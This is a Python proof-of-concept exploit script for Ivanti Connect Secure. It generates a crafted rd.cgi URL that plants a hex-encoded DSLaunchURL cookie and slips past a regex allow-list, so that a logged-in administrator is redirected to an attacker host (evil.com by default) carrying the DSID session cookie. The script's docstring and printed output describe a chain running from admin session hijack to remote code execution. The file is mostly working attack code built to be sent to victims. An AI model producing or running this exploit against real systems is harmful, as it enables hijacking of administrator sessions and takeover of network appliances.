#!/usr/bin/env python3
"""
Ivanti Connect Secure — Admin Session Hijack via DSLaunchURL Cookie Injection (ZD-19)

Severity: CRITICAL
Type: Session Hijacking / Open Redirect (Post-Auth Admin)
Pre-Auth Required: YES (rd.cgi sets cookie without auth)

Vulnerability Chain:
  1. rd.cgi (pre-auth) sets DSLaunchURL cookie from URL parameter
  2. Admin user logs in with valid credentials
  3. login.cgi reads DSLaunchURL, hex-decodes it to a URL
  4. URL is checked against allow_redirect_urls with REGEX CONTAINS (not exact match)
  5. allow_redirect_urls = ["/dana-admin/reporting/report_device_discovery.cgi"]
  6. Attacker URL: http://evil.com/dana-admin/reporting/report_device_discovery.cgi
     → regex matches (contains the allowed path) → BYPASS
  7. Admin is redirected to evil.com with DSID session cookie
  8. Attacker captures admin session

Root Cause:
  - rd.cgi allows pre-auth cookie injection (no taint mode, no value sanitization)
  - login.cgi uses regex CONTAINS check ($url =~ /pattern/) instead of exact match
  - groom_url with DONT_REMOVE_HOSTNAME preserves attacker's domain

Impact:
  - Full admin session hijack
  - Combined with RBAC bypass → command execution → RCE

Usage:
  python3 poc_admin_session_hijack.py https://target.com
  python3 poc_admin_session_hijack.py https://target.com http://evil.com
"""

import sys
import urllib.parse


def generate_payload(target, evil_host="http://evil.com"):
    """Generate the attack URL"""
    # The redirect URL must contain the allowed path to bypass regex check
    bypass_url = f"{evil_host}/dana-admin/reporting/report_device_discovery.cgi"

    # Hex-encode for DSLaunchURL cookie
    hex_encoded = bypass_url.encode().hex()

    # rd.cgi URL to set the cookie
    attack_url = f"{target}/dana-na/auth/rd.cgi?DSLaunchURL={hex_encoded}"

    return attack_url, bypass_url, hex_encoded


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [evil_host]")
        sys.exit(1)

    target = sys.argv[1].rstrip("/")
    evil_host = sys.argv[2] if len(sys.argv) > 2 else "http://evil.com"

    attack_url, bypass_url, hex_encoded = generate_payload(target, evil_host)

    print()
    print("  Ivanti ICS Admin Session Hijack (ZD-19)")
    print("  via DSLaunchURL Cookie Injection + Regex Bypass")
    print()
    print(f"  Target:     {target}")
    print(f"  Evil Host:  {evil_host}")
    print()
    print(f"  Bypass URL: {bypass_url}")
    print(f"  Hex Cookie: {hex_encoded}")
    print()
    print(f"  Attack URL (send to admin):")
    print(f"    {attack_url}")
    print()
    print("  Attack Flow:")
    print("    1. Admin clicks the attack URL")
    print("    2. rd.cgi sets DSLaunchURL cookie (pre-auth, no validation)")
    print("    3. Admin proceeds to login with credentials")
    print("    4. login.cgi reads DSLaunchURL cookie")
    print("    5. hexDecode → bypass URL containing allowed path")
    print(f"    6. Regex check: '{bypass_url}' =~ /report_device_discovery.cgi/ → PASS")
    print(f"    7. Redirect to {evil_host} with DSID cookie")
    print("    8. evil.com captures admin DSID → full session hijack")
    print()
    print("  Impact: Full admin account takeover → RCE via REST API")


if __name__ == "__main__":
    main()
